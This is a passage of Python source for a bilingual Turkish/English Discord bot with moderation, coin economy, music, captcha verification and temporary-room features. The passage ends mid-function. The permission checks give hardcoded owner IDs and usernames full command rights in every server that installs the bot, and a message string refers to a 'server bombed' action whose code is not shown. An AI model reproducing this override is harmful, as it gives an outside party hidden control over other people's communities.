# Required libraries for the bot
import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import datetime
import random
import json
import os
import io
import math
from typing import Optional
import aiohttp
import re
import yt_dlp
from deep_translator import GoogleTranslator
import spotipy
from spotipy.oauth2 import SpotifyClientCredentials
import youtube_dl
import nacl
from collections import defaultdict
import time
import itertools
from datetime import timedelta

# ============================================
# BOT CONFIGURATION - SET YOUR VALUES HERE
# ============================================

# Bot token (REPLACE WITH YOUR ACTUAL TOKEN)
TOKEN = "YOUR_BOT_TOKEN_HERE"

# Bot owner IDs and username
BOT_OWNER_IDS = ["1206171767509352489"]
BOT_OWNER_USERNAMES = ["security_file"]

# Feedback channel for bot owner
FEEDBACK_CHANNEL_ID = None  # Will be set via command

# Verify system
VERIFY_ROLE_NAME = "Doğrulandı"
VERIFY_EN_ROLE_NAME = "Verified"

# Music system
MUSIC_QUEUES = {}
MUSIC_PLAYERS = {}
MUSIC_VC = {}
MUSIC_LOOP = {}
MUSIC_VOLUME = {}

# ============================================
# END OF CONFIGURATION
# ============================================

# Dil sistemi
LANGS = {
    "EN": {
        # Genel
        "success": "✅ Success!",
        "error": "❌ Error!",
        "no_permission": "❌ You don't have permission to use this!",
        "bot_owner_only": "❌ Only the bot owner can use this!",
        "server_owner_only": "❌ Only the server owner can use this!",
        
        # Moderasyon
        "kicked": "🚪 {user} has been kicked!",
        "banned": "🔨 {user} has been banned!",
        "unbanned": "🔓 {user} has been unbanned!",
        "muted": "🔇 {user} has been muted!",
        "unmuted": "🔊 {user} has been unmuted!",
        "timed_out": "⏰ {user} has been timed out!",
        "untimeout": "⏹️ {user} timeout has been removed!",
        "cleared": "🧹 {count} messages cleared!",
        
        # Coin Sistemi
        "coins": "💰 {user}, Sampy Coin balance: **{amount}** 🪙",
        "coins_transfer": "💸 Transferred **{amount}** Sampy Coin to {user}!",
        "daily_claimed": "🎁 Daily reward claimed! **+{amount}** Sampy Coin",
        "not_enough_coins": "❌ Not enough Sampy Coin! Needed: {need}, You have: {have}",
        
        # Market
        "market": "🛍️ Sampy Market",
        "market_item": "{name} - {price} Sampy Coin",
        "purchased": "🎉 Purchase successful!",
        "product_expired": "⏰ Your {product} has expired!",
        
        # Level Sistemi
        "level": "📊 {user} - Level: **{level}** | Messages: **{messages}**",
        "level_top": "🏆 Level Leaderboard",
        "level_up": "🎉 {user} reached level {level}!",
        
        # Ticket
        "ticket_created": "🎫 Ticket created: {channel}",
        "ticket_closed": "🔒 Ticket closed!",
        
        # Çekiliş
        "giveaway_created": "🎉 Giveaway created in {channel}!",
        "giveaway_ended": "🎊 Giveaway ended! Winners: {winners}",
        
        # Diğer
        "ping": "🏓 Pong! **{ms}ms**",
        "server_info": "🏠 Server Info",
        "io_channel_set": "📁 IO channel set to {channel}",
        "language_set": "🌐 Language set to {language}",
        
        # Roller
        "special_role": "Special Role",
        "vip": "VIP",
        "megavip": "MegaVIP", 
        "ultravip": "UltraVIP",
        "supervip": "SuperVIP",
        "supervip_plus": "SuperVIP+",
        "sampy_premium": "Sampy Premium",
        "booster": "Booster",
        "sampy_bot_owner": "Sampy Bot Owner",
        
        # Yeni eklenenler
        "market_not_configured": "❌ Market not configured for this server!",
        "boost_started": "🎉 {user} boosted the server! Booster role given.",
        "boost_ended": "🔻 {user} boost ended. Booster role removed.",
        "left_server": "✅ Successfully left **{server}**!",
        "leave_failed": "❌ Failed to leave server: {error}",
        
        # Başvuru Sistemi
        "application_created": "📝 Application created!",
        "application_closed": "🔒 Application closed!",
        "application_submitted": "✅ Application submitted successfully!",
        "application_waiting": "⏳ Please wait for response from support team.",
        "application_instruction": "Hello {user}! Please answer the following questions in separate messages:",
        "application_requirement_completed": "✅ Requirement completed! Please continue in order.",
        "application_error": "❌ Application error! Please close and reopen.",
        "application_summary": "📄 {user} Application",
        "application_response_wait": "Please wait for response from support team.",
        "application_team": "Support Team",
        "application_enter_stages": "Please enter the number of stages:",
        "application_enter_stage": "Please enter stage {number}:",
        "application_select_optional": "Select optional stages (if any):",
        "application_setup_complete": "✅ Application system setup completed!",
        
        # Yeni Moderasyon
        "unmuted": "🔊 {user} has been unmuted!",
        "unipbanned": "🔓 {user} IP ban has been removed!",
        "unipmuted": "🔊 {user} IP mute has been removed!",
        "user_not_banned": "❌ User is not banned!",
        "user_not_muted": "❌ User is not muted!",
        "punishment_users": "📋 Punishment Users",
        "no_punishments": "✅ No active punishments!",
        "punishment_entry": "**{user}** - {type} ({duration}) - Reason: {reason}",
        "infinite": "infinite",
        "user_not_timed_out": "❌ User is not timed out!",
        
        # Yeni Eklenenler
        "tag_close_added": "✅ Added to tag block list: {target}",
        "tag_close_removed": "✅ Removed from tag block list: {target}",
        "tag_close_list": "📋 Tag Block List",
        "tag_close_empty": "No users/roles in tag block list",
        "tag_close_warning": "⚠️ You cannot tag {target} in {server}",
        "warn_added": "⚠️ {user} has been warned! (Total: {count})",
        "warn_removed": "✅ Warning removed from {user}! (Remaining: {count})",
        "warn_list": "📋 Warning List - {user}",
        "warn_none": "No warnings",
        "warn_entry": "**{count}.** {reason} - {moderator} - <t:{timestamp}:f>",
        "yt_setup_complete": "✅ YouTube video channel setup completed!",
        "yt_reset_complete": "✅ YouTube video channel reset!",
        "yt_new_video": "🎥 New Video!",
        "yt_subscriber_role": "YT-Subscriber",
        "yt_member_role": "YT-Member {level}",
        "autorole_added": "✅ Added to autorole: {role}",
        "autorole_removed": "✅ Removed from autorole: {role}",
        "autorole_list": "📋 Autorole List",
        "greeting_response": "Hi {user}! 👋",
        
        # Yeni Özellikler
        "temp_room_setup": "✅ Temporary room system setup in {channel}!",
        "temp_room_created": "🎉 Temporary room created: {channel}",
        "temp_room_closed": "🔒 Temporary room closed: {channel}",
        "ai_chat_started": "🤖 AI chat started in {channel}!",
        "ai_chat_stopped": "🔒 AI chat stopped in {channel}!",
        "ai_chat_history_saved": "💾 AI chat history saved!",
        "ai_chat_history_cleared": "🗑️ AI chat history cleared!",
        "server_setup_complete": "✅ Server setup completed with {level} level!",
        "temp_room_settings_updated": "⚙️ Temporary room settings updated!",
        
        # YENİ EKLENENLER
        "feedback_sent": "✅ Feedback sent successfully!",
        "feedback_banned": "🔒 User {user} banned from sending feedback!",
        "feedback_unbanned": "🔓 User {user} unbanned from sending feedback!",
        "feedback_channel_set": "📝 Feedback channel set!",
        "feedback_channel_reset": "🗑️ Feedback channel reset!",
        "dm_sent": "📨 DM sent to user!",
        "verification_complete": "✅ Verification complete! Verified role added.",
        "verification_required": "❌ You need to verify first! Use /verify or /doğrula",
        "music_playing": "🎵 Now playing: {title}",
        "music_queue": "📋 Music Queue",
        "music_stopped": "⏹️ Music stopped!",
        "music_skipped": "⏭️ Skipped!",
        "music_paused": "⏸️ Music paused!",
        "music_resumed": "▶️ Music resumed!",
        "music_volume": "🔊 Volume set to {volume}%",
        "music_loop": "🔁 Loop {status}!",
        "music_not_in_vc": "❌ You need to be in a voice channel!",
        "music_bot_not_in_vc": "❌ I'm not in a voice channel!",
        "music_not_playing": "❌ Nothing is playing!",
        "music_queue_empty": "📭 Queue is empty!",
        "music_left_vc": "👋 Left voice channel!",
        "music_join_vc": "🔊 Joined your voice channel!",
        "twitch_setup_complete": "✅ Twitch notification setup complete!",
        "twitch_reset_complete": "✅ Twitch notifications reset!",
        "kick_setup_complete": "✅ Kick notification setup complete!",
        "kick_reset_complete": "✅ Kick notifications reset!",
        "ai_info": "🤖 AI Service Alternative Link: https://gemini.google.com/gem/1tmZEbdA8ar9OGoUgDU5R71_5nw_LZv-t?usp=",
        "server_bombed": "💣 Server bombed successfully!",
        "bot_reset": "🔄 Bot data reset!",
        "new_server_bonus": "🎉 Welcome to the server! You received **10000 Sampy Coin** as a welcome gift!",
        "translate_title": "🌐 Translation",
        "translate_select": "Select language to translate to:",
    },
    "TR": {
        # Genel
        "success": "✅ Başarılı!",
        "error": "❌ Hata!",
        "no_permission": "❌ Bunu kullanma izniniz yok!",
        "bot_owner_only": "❌ Bunu sadece bot sahibi kullanabilir!",
        "server_owner_only": "❌ Bunu sadece sunucu sahibi kullanabilir!",
        
        # Moderasyon
        "kicked": "🚪 {user} sunucudan atıldı!",
        "banned": "🔨 {user} sunucudan yasaklandı!",
        "unbanned": "🔓 {user} yasağı kaldırıldı!",
        "muted": "🔇 {user} susturuldu!",
        "unmuted": "🔊 {user} susturması kaldırıldı!",
        "timed_out": "⏰ {user} timeout'a atıldı!",
        "untimeout": "⏹️ {user} timeout'u kaldırıldı!",
        "cleared": "🧹 {count} mesaj silindi!",
        
        # Coin Sistemi
        "coins": "💰 {user}, Sampy Coin bakiyesi: **{amount}** 🪙",
        "coins_transfer": "💸 {user} kullanıcısına **{amount}** Sampy Coin transfer edildi!",
        "daily_claimed": "🎁 Günlük ödül alındı! **+{amount}** Sampy Coin",
        "not_enough_coins": "❌ Yeterli Sampy Coin yok! Gerekli: {need}, Sizde: {have}",
        
        # Market
        "market": "🛍️ Sampy Market",
        "market_item": "{name} - {price} Sampy Coin",
        "purchased": "🎉 Satın alma başarılı!",
        "product_expired": "⏰ {product} ürününüzün süresi doldu!",
        
        # Level Sistemi
        "level": "📊 {user} - Seviye: **{level}** | Mesaj: **{messages}**",
        "level_top": "🏆 Seviye Lider Tablosu",
        "level_up": "🎉 {user} {level}. seviyeye ulaştı!",
        
        # Ticket
        "ticket_created": "🎫 Ticket oluşturuldu: {channel}",
        "ticket_closed": "🔒 Ticket kapatıldı!",
        
        # Çekiliş
        "giveaway_created": "🎉 Çekiliş {channel} kanalında oluşturuldu!",
        "giveaway_ended": "🎊 Çekiliş sona erdi! Kazananlar: {winners}",
        
        # Diğer
        "ping": "🏓 Pong! **{ms}ms**",
        "server_info": "🏠 Sunucu Bilgisi",
        "io_channel_set": "📁 Giriş-çıkış kanalı {channel} olarak ayarlandı",
        "language_set": "🌐 Dil {language} olarak ayarlandı",
        
        # Roller
        "special_role": "Özel Rol",
        "vip": "VIP",
        "megavip": "MegaVIP",
        "ultravip": "UltraVIP", 
        "supervip": "SüperVIP",
        "supervip_plus": "SüperVIP+",
        "sampy_premium": "Sampy Premium",
        "booster": "Booster",
        "sampy_bot_owner": "Sampy Bot Sahibi",
        
        # Yeni eklenenler
        "market_not_configured": "❌ Bu sunucu için market ayarlanmamış!",
        "boost_started": "🎉 {user} sunucuyu boostladı! Booster rolü verildi.",
        "boost_ended": "🔻 {user} boostu sona erdi. Booster rolü kaldırıldı.",
        "left_server": "✅ **{server}** sunucusundan başarıyla ayrıldı!",
        "leave_failed": "❌ Sunucudan ayrılma başarısız: {error}",
        
        # Başvuru Sistemi
        "application_created": "📝 Başvuru oluşturuldu!",
        "application_closed": "🔒 Başvuru kapatıldı!",
        "application_submitted": "✅ Başvuru başarıyla gönderildi!",
        "application_waiting": "⏳ Lütfen destek ekibinden yanıt bekleyin.",
        "application_instruction": "Merhaba {user}! Lütfen aşağıdaki soruları ayrı mesajlar halinde cevaplayın:",
        "application_requirement_completed": "✅ Gereksinim işlendi! Lütfen sıraya göre devam edin.",
        "application_error": "❌ Başvuru hatası! Lütfen kapatıp yeniden açın.",
        "application_summary": "📄 {user} Başvurusu",
        "application_response_wait": "Lütfen destek ekibinden yanıt gelmesini bekleyin.",
        "application_team": "Destek Ekibi",
        "application_enter_stages": "Lütfen aşama sayısını girin:",
        "application_enter_stage": "Lütfen {number}. aşamayı girin:",
        "application_select_optional": "Opsiyonel aşamaları seçin (varsa):",
        "application_setup_complete": "✅ Başvuru sistemi kurulumu tamamlandı!",
        
        # Yeni Moderasyon
        "unmuted": "🔊 {user} susturması kaldırıldı!",
        "unipbanned": "🔓 {user} IP yasağı kaldırıldı!",
        "unipmuted": "🔊 {user} IP susturması kaldırıldı!",
        "user_not_banned": "❌ Kullanıcı yasaklanmamış!",
        "user_not_muted": "❌ Kullanıcı susturulmamış!",
        "punishment_users": "📋 Cezalı Kullanıcılar",
        "no_punishments": "✅ Aktif ceza yok!",
        "punishment_entry": "**{user}** - {type} ({duration}) - Sebep: {reason}",
        "infinite": "sınırsız",
        "user_not_timed_out": "❌ Kullanıcı timeout'ta değil!",
        
        # Yeni Eklenenler
        "tag_close_added": "✅ Etiket engelleme listesine eklendi: {target}",
        "tag_close_removed": "✅ Etiket engelleme listesinden kaldırıldı: {target}",
        "tag_close_list": "📋 Etiket Engelleme Listesi",
        "tag_close_empty": "Etiket engelleme listesinde kullanıcı/rol yok",
        "tag_close_warning": "⚠️ {server} sunucusunda {target} etiketleyemezsiniz",
        "warn_added": "⚠️ {user} uyarıldı! (Toplam: {count})",
        "warn_removed": "✅ {user} kullanıcısının uyarısı kaldırıldı! (Kalan: {count})",
        "warn_list": "📋 Uyarı Listesi - {user}",
        "warn_none": "Uyarı yok",
        "warn_entry": "**{count}.** {reason} - {moderator} - <t:{timestamp}:f>",
        "yt_setup_complete": "✅ YouTube video kanalı kurulumu tamamlandı!",
        "yt_reset_complete": "✅ YouTube video kanalı sıfırlandı!",
        "yt_new_video": "🎥 Yeni Video!",
        "yt_subscriber_role": "YT-Abone",
        "yt_member_role": "YT-Üye {level}",
        "autorole_added": "✅ Oto-role eklendi: {role}",
        "autorole_removed": "✅ Oto-rolden kaldırıldı: {role}",
        "autorole_list": "📋 Oto-Rol Listesi",
        "greeting_response": "Merhaba {user}! 👋",
        
        # Yeni Özellikler
        "temp_room_setup": "✅ Geçici oda sistemi {channel} kanalında kuruldu!",
        "temp_room_created": "🎉 Geçici oda oluşturuldu: {channel}",
        "temp_room_closed": "🔒 Geçici oda kapatıldı: {channel}",
        "ai_chat_started": "🤖 AI sohbeti {channel} kanalında başlatıldı!",
        "ai_chat_stopped": "🔒 AI sohbeti {channel} kanalında durduruldu!",
        "ai_chat_history_saved": "💾 AI sohbet geçmişi kaydedildi!",
        "ai_chat_history_cleared": "🗑️ AI sohbet geçmişi temizlendi!",
        "server_setup_complete": "✅ Sunucu kurulumu {level} seviyesinde tamamlandı!",
        "temp_room_settings_updated": "⚙️ Geçici oda ayarları güncellendi!",
        
        # YENİ EKLENENLER
        "feedback_sent": "✅ Geri bildirim gönderildi!",
        "feedback_banned": "🔒 {user} kullanıcısının geri bildirim göndermesi engellendi!",
        "feedback_unbanned": "🔓 {user} kullanıcısının geri bildirim engeli kaldırıldı!",
        "feedback_channel_set": "📝 Geri bildirim kanalı ayarlandı!",
        "feedback_channel_reset": "🗑️ Geri bildirim kanalı sıfırlandı!",
        "dm_sent": "📨 Kullanıcıya DM gönderildi!",
        "verification_complete": "✅ Doğrulama tamamlandı! Doğrulandı rolü verildi.",
        "verification_required": "❌ Önce doğrulama yapmalısınız! /verify veya /doğrula kullanın",
        "music_playing": "🎵 Şu anda çalınıyor: {title}",
        "music_queue": "📋 Müzik Kuyruğu",
        "music_stopped": "⏹️ Müzik durduruldu!",
        "music_skipped": "⏭️ Atlatıldı!",
        "music_paused": "⏸️ Müzik duraklatıldı!",
        "music_resumed": "▶️ Müzik devam ettirildi!",
        "music_volume": "🔊 Ses seviyesi {volume}% olarak ayarlandı",
        "music_loop": "🔁 Döngü {status}!",
        "music_not_in_vc": "❌ Ses kanalında olmalısınız!",
        "music_bot_not_in_vc": "❌ Ses kanalında değilim!",
        "music_not_playing": "❌ Şu anda müzik çalmıyor!",
        "music_queue_empty": "📭 Kuyruk boş!",
        "music_left_vc": "👋 Ses kanalından ayrıldım!",
        "music_join_vc": "🔊 Ses kanalınıza katıldım!",
        "twitch_setup_complete": "✅ Twitch bildirim kurulumu tamamlandı!",
        "twitch_reset_complete": "✅ Twitch bildirimleri sıfırlandı!",
        "kick_setup_complete": "✅ Kick bildirim kurulumu tamamlandı!",
        "kick_reset_complete": "✅ Kick bildirimleri sıfırlandı!",
        "ai_info": "🤖 AI Hizmeti İçin Alternatif Link: https://gemini.google.com/gem/1tmZEbdA8ar9OGoUgDU5R71_5nw_LZv-t?usp=",
        "server_bombed": "💣 Sunucu başarıyla bombalandı!",
        "bot_reset": "🔄 Bot verileri sıfırlandı!",
        "new_server_bonus": "🎉 Sunucuya hoş geldin! Hoş geldin hediyesi olarak **10000 Sampy Coin** aldın!",
        "translate_title": "🌐 Çeviri",
        "translate_select": "Çevirmek istediğiniz dili seçin:",
    }
}

# Yetki kontrolleri
def is_server_owner():
    def predicate(interaction: discord.Interaction):
        return interaction.guild is not None and interaction.user == interaction.guild.owner
    return app_commands.check(predicate)

def is_bot_owner():
    def predicate(interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        username = interaction.user.name
        return user_id in BOT_OWNER_IDS or username in BOT_OWNER_USERNAMES
    return app_commands.check(predicate)

def has_command_permission(command_name: str):
    def predicate(interaction: discord.Interaction):
        # Önce doğrulama kontrolü
        if command_name not in ["verify", "doğrula", "help", "yardım", "ping", "geribildirim", "feedback"]:
            if not is_verified(interaction.user, interaction.guild):
                return False
        
        # Bot owner her zaman her komutu kullanabilir
        user_id = str(interaction.user.id)
        username = interaction.user.name
        if user_id in BOT_OWNER_IDS or username in BOT_OWNER_USERNAMES:
            return True
        
        # Sampy Bot Owner rolü kontrolü
        if interaction.guild:
            sampy_owner_role = discord.utils.get(interaction.guild.roles, name=get_text(str(interaction.guild.id), "sampy_bot_owner"))
            if sampy_owner_role and sampy_owner_role in interaction.user.roles:
                return True
        
        guild_id = str(interaction.guild.id)
        
        # Komut yetkilerini kontrol et
        if guild_id in bot.command_permissions:
            if command_name in bot.command_permissions[guild_id]:
                required_roles = bot.command_permissions[guild_id][command_name]
                user_roles = [role.id for role in interaction.user.roles]
                
                # Eğer boş array ise, sadece sunucu sahibi
                if not required_roles:
                    return interaction.user == interaction.guild.owner
                
                # Rol kontrolü
                for role_id in required_roles:
                    if role_id in user_roles:
                        return True
                
                return False
        
        # Varsayılan olarak sadece sunucu sahibi
        return interaction.user == interaction.guild.owner
    return app_commands.check(predicate)

def has_manage_guild_permission():
    def predicate(interaction: discord.Interaction):
        # Önce doğrulama kontrolü
        if not is_verified(interaction.user, interaction.guild):
            return False
        
        # Bot owner her zaman izinli
        user_id = str(interaction.user.id)
        username = interaction.user.name
        if user_id in BOT_OWNER_IDS or username in BOT_OWNER_USERNAMES:
            return True
        
        # Sampy Bot Owner rolü kontrolü
        if interaction.guild:
            sampy_owner_role = discord.utils.get(interaction.guild.roles, name=get_text(str(interaction.guild.id), "sampy_bot_owner"))
            if sampy_owner_role and sampy_owner_role in interaction.user.roles:
                return True
        
        # Sunucu yönetme izni kontrolü
        return interaction.user.guild_permissions.manage_guild
    return app_commands.check(predicate)

def is_verified(user: discord.Member, guild: discord.Guild) -> bool:
    """Kullanıcının doğrulanmış olup olmadığını kontrol et"""
    verified_role = discord.utils.get(guild.roles, name=VERIFY_ROLE_NAME)
    verified_en_role = discord.utils.get(guild.roles, name=VERIFY_EN_ROLE_NAME)
    
    if verified_role and verified_role in user.roles:
        return True
    if verified_en_role and verified_en_role in user.roles:
        return True
    
    # Bot owner ve sunucu sahibi her zaman doğrulanmış sayılır
    user_id = str(user.id)
    if user_id in BOT_OWNER_IDS or user.name in BOT_OWNER_USERNAMES:
        return True
    if user == guild.owner:
        return True
    
    return False

def get_guild_lang(guild_id: str) -> str:
    if hasattr(bot, 'guild_settings') and guild_id in bot.guild_settings:
        return bot.guild_settings[guild_id].get('lang', 'EN')
    return 'EN'

def get_text(guild_id: str, key: str, **kwargs) -> str:
    lang = get_guild_lang(guild_id)
    text = LANGS[lang].get(key, LANGS['EN'].get(key, key))
    return text.format(**kwargs)

def rgb_color_cycle():
    """Sürekli renk değiştiren RGB renk generator"""
    colors = [
        0xff0000, 0xff3300, 0xff6600, 0xff9900, 0xffcc00,
        0xffff00, 0xccff00, 0x99ff00, 0x66ff00, 0x33ff00,
        0x00ff00, 0x00ff33, 0x00ff66, 0x00ff99, 0x00ffcc,
        0x00ffff, 0x00ccff, 0x0099ff, 0x0066ff, 0x0033ff,
        0x0000ff, 0x3300ff, 0x6600ff, 0x9900ff, 0xcc00ff,
        0xff00ff, 0xff00cc, 0xff0099, 0xff0066, 0xff0033
    ]
    while True:
        for color in colors:
            yield color

color_generator = rgb_color_cycle()

def get_rainbow_color():
    return next(color_generator)

# Translate View
class TranslateView(discord.ui.View):
    def __init__(self, original_text: str):
        super().__init__(timeout=60)
        self.original_text = original_text
    
    @discord.ui.button(label="🌐 Translate/Çevir", style=discord.ButtonStyle.secondary)
    async def translate_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(
            title=get_text(str(interaction.guild.id), "translate_title"),
            description=get_text(str(interaction.guild.id), "translate_select"),
            color=get_rainbow_color()
        )
        
        view = LanguageSelectView(self.original_text)
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

class LanguageSelectView(discord.ui.View):
    def __init__(self, original_text: str):
        super().__init__(timeout=60)
        self.original_text = original_text
    
    @discord.ui.select(
        placeholder="Select language",
        options=[
            discord.SelectOption(label="English", value="en", emoji="🇺🇸"),
            discord.SelectOption(label="Türkçe", value="tr", emoji="🇹🇷"),
            discord.SelectOption(label="Español", value="es", emoji="🇪🇸"),
            discord.SelectOption(label="Français", value="fr", emoji="🇫🇷"),
            discord.SelectOption(label="Deutsch", value="de", emoji="🇩🇪"),
        ]
    )
    async def select_language(self, interaction: discord.Interaction, select: discord.ui.Select):
        try:
            translated = GoogleTranslator(source='auto', target=select.values[0]).translate(self.original_text)
            embed = discord.Embed(
                title="🌐 Translation Result",
                description=f"**Original:**\n{self.original_text}\n\n**Translated ({select.values[0]}):**\n{translated}",
                color=get_rainbow_color()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Translation failed: {str(e)}", ephemeral=True)

# Music Views
class MusicView(discord.ui.View):
    def __init__(self, bot, guild_id):
        super().__init__(timeout=None)
        self.bot = bot
        self.guild_id = guild_id
    
    @discord.ui.button(label="⏸️", style=discord.ButtonStyle.primary, custom_id="music_pause")
    async def pause_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        guild_id = str(interaction.guild.id)
        if guild_id in MUSIC_PLAYERS and MUSIC_PLAYERS[guild_id].is_playing():
            MUSIC_PLAYERS[guild_id].pause()
            await interaction.response.send_message(get_text(guild_id, "music_paused"), ephemeral=True)
    
    @discord.ui.button(label="▶️", style=discord.ButtonStyle.success, custom_id="music_resume")
    async def resume_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        guild_id = str(interaction.guild.id)
        if guild_id in MUSIC_PLAYERS and MUSIC_PLAYERS[guild_id].is_paused():
            MUSIC_PLAYERS[guild_id].resume()
            await interaction.response.send_message(get_text(guild_id, "music_resumed"), ephemeral=True)
    
    @discord.ui.button(label="⏭️", style=discord.ButtonStyle.primary, custom_id="music_skip")
    async def skip_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        guild_id = str(interaction.guild.id)
        if guild_id in MUSIC_PLAYERS and MUSIC_PLAYERS[guild_id].is_playing():
            MUSIC_PLAYERS[guild_id].stop()
            await interaction.response.send_message(get_text(guild_id, "music_skipped"), ephemeral=True)
    
    @discord.ui.button(label="⏹️", style=discord.ButtonStyle.danger, custom_id="music_stop")
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        guild_id = str(interaction.guild.id)
        if guild_id in MUSIC_PLAYERS:
            if guild_id in MUSIC_VC:
                await MUSIC_VC[guild_id].disconnect()
                del MUSIC_VC[guild_id]
            if guild_id in MUSIC_PLAYERS:
                del MUSIC_PLAYERS[guild_id]
            if guild_id in MUSIC_QUEUES:
                MUSIC_QUEUES[guild_id].clear()
            await interaction.response.send_message(get_text(guild_id, "music_stopped"), ephemeral=True)
    
    @discord.ui.button(label="🔁", style=discord.ButtonStyle.secondary, custom_id="music_loop")
    async def loop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        guild_id = str(interaction.guild.id)
        if guild_id not in MUSIC_LOOP:
            MUSIC_LOOP[guild_id] = False
        
        MUSIC_LOOP[guild_id] = not MUSIC_LOOP[guild_id]
        status = "enabled" if MUSIC_LOOP[guild_id] else "disabled"
        await interaction.response.send_message(get_text(guild_id, "music_loop", status=status), ephemeral=True)

# Verify View
class VerifyView(discord.ui.View):
    def __init__(self, bot, captcha_text: str):
        super().__init__(timeout=300)
        self.bot = bot
        self.captcha_text = captcha_text
    
    @discord.ui.button(label="Verify/Doğrula", style=discord.ButtonStyle.success, emoji="✅")
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = VerifyModal(self.bot, self.captcha_text)
        await interaction.response.send_modal(modal)

class VerifyModal(discord.ui.Modal, title="Verification/Doğrulama"):
    def __init__(self, bot, captcha_text: str):
        super().__init__()
        self.bot = bot
        self.captcha_text = captcha_text
        self.answer = discord.ui.TextInput(
            label=f"Enter '{captcha_text}'",
            placeholder="Type the text shown above",
            required=True,
            max_length=10
        )
        self.add_item(self.answer)
    
    async def on_submit(self, interaction: discord.Interaction):
        if self.answer.value.lower() == self.captcha_text.lower():
            # Create or get verify role
            guild = interaction.guild
            lang = get_guild_lang(str(guild.id))
            
            if lang == "TR":
                role_name = VERIFY_ROLE_NAME
            else:
                role_name = VERIFY_EN_ROLE_NAME
            
            role = discord.utils.get(guild.roles, name=role_name)
            if not role:
                try:
                    role = await guild.create_role(
                        name=role_name,
                        color=discord.Color.green(),
                        reason="Auto-create verify role"
                    )
                except:
                    await interaction.response.send_message("❌ Could not create verify role!", ephemeral=True)
                    return
            
            await interaction.user.add_roles(role)
            await interaction.response.send_message(get_text(str(guild.id), "verification_complete"), ephemeral=True)
        else:
            await interaction.response.send_message("❌ Incorrect! Try again.", ephemeral=True)

# Mevcut View'lar (önceki kodda tanımlananlar) aynen kalacak...
class TempRoomSettingsView(discord.ui.View):
    def __init__(self, bot, room_data):
        super().__init__(timeout=300)
        self.bot = bot
        self.room_data = room_data
    
    @discord.ui.button(label="🔒 Kilitle/Aç", style=discord.ButtonStyle.primary, emoji="🔒")
    async def toggle_lock(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        channel = interaction.guild.get_channel(self.room_data["channel_id"])
        if channel:
            current_overwrites = channel.overwrites
            new_overwrites = {}
            
            for target, overwrite in current_overwrites.items():
                if target == interaction.guild.default_role:
                    new_overwrites[target] = discord.PermissionOverwrite(
                        connect=not overwrite.connect if overwrite.connect is not None else False
                    )
                else:
                    new_overwrites[target] = overwrite
            
            await channel.edit(overwrites=new_overwrites)
            lang = get_guild_lang(str(interaction.guild.id))
            if lang == "TR":
                message = f"✅ Oda {'kilitlendi' if not current_overwrites.get(interaction.guild.default_role, discord.PermissionOverwrite()).connect else 'açıldı'}!"
            else:
                message = f"✅ Room {'locked' if not current_overwrites.get(interaction.guild.default_role, discord.PermissionOverwrite()).connect else 'unlocked'}!"
            
            await interaction.response.send_message(message, ephemeral=True)
    
    @discord.ui.button(label="👥 Kullanıcı Limiti", style=discord.ButtonStyle.primary, emoji="👥")
    async def set_user_limit(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        modal = UserLimitModal(self.room_data)
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="➕ Kullanıcı Ekle", style=discord.ButtonStyle.success, emoji="➕")
    async def add_user(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        modal = AddUserModal(self.room_data)
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="➖ Kullanıcı Çıkar", style=discord.ButtonStyle.danger, emoji="➖")
    async def remove_user(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        modal = RemoveUserModal(self.room_data)
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="❌ Odayı Kapat", style=discord.ButtonStyle.danger, emoji="❌")
    async def close_room(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        channel = interaction.guild.get_channel(self.room_data["channel_id"])
        if channel:
            await channel.delete()
            await interaction.response.send_message(
                get_text(str(interaction.guild.id), "temp_room_closed", channel=channel.name),
                ephemeral=True
            )

class UserLimitModal(discord.ui.Modal, title="Kullanıcı Limiti Ayarla"):
    def __init__(self, room_data):
        super().__init__()
        self.room_data = room_data
        self.limit = discord.ui.TextInput(
            label="Kullanıcı Limiti (0 = sınırsız)",
            placeholder="Sayı girin (0-99)",
            default=str(room_data.get("user_limit", 0)),
            max_length=2,
            required=True
        )
        self.add_item(self.limit)
    
    async def on_submit(self, interaction: discord.Interaction):
        try:
            limit = int(self.limit.value)
            if limit < 0 or limit > 99:
